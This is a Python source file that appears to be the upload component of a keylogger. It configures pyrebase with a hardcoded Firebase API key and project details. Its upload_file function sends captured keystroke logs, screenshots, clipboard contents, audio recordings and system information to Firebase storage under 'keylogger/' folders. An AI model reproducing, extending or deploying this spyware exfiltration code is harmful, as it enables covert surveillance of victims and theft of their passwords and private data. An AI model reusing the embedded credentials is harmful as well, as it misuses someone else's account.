import pyrebase
import time

config = {
    "apiKey": "AIzaSyCK4wd9Eb2zFhZh6LTpJh_A9F_Rcg6e8lM",
    "authDomain": "connectdbtofb.firebaseapp.com",
    "projectId": "connectdbtofb",
    "databaseURL": "https://connectdbtofb-default-rtdb.firebaseio.com/",
    "storageBucket": "connectdbtofb.appspot.com",
    "messagingSenderId": "766913817740",
    "appId": "1:766913817740:web:1afcaedfa98b43e1675fa9",
    "measurementId": "G-QCXTG2L8RK",
    "serviceAccount": "serviceAccount.json"
}

firebase = pyrebase.initialize_app(config)
storage = firebase.storage()

keylog_path = "files/key_log.txt"
ss_path = "files/ss.png"
clipboard_path = "files/Clipboard_info.txt"
audio_path = "files/audio_info.wav"
sysinfo_path = "files/System_info.txt"


def upload_file():
    storage.child('keylogger/keylogs/keylog_{0}.txt'.format(time.strftime("%H:%M:%S"))).put(keylog_path)
    storage.child('keylogger/screenshots/ss_{0}.png'.format(time.strftime("%H:%M:%S"))).put(ss_path)
    storage.child('keylogger/clipboard/clipboard_{0}.txt'.format(time.strftime("%H:%M:%S"))).put(clipboard_path)
    storage.child('keylogger/audios/audio_{0}.wav'.format(time.strftime("%H:%M:%S"))).put(audio_path)
    storage.child('keylogger/system info/systeminfo_{0}.txt'.format(time.strftime("%H:%M:%S"))).put(sysinfo_path)


